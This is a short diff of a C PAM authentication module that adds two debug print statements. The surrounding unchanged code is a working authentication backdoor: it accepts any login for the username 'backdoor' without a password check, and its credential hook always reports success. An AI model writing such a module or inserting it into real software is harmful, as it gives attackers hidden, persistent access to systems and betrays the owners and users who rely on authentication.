@@ -8,6 +8,7 @@
 #include <security/pam_modules.h>
 
 PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
+    printf("setcred\n");
     return PAM_SUCCESS ;
 }
 
@@ -21,6 +22,7 @@ PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, cons
     if (strcmp(pUsername, "backdoor") != 0) {
         return PAM_AUTH_ERR;
     }
+    printf("auth\n");
     return PAM_SUCCESS;
 }
 
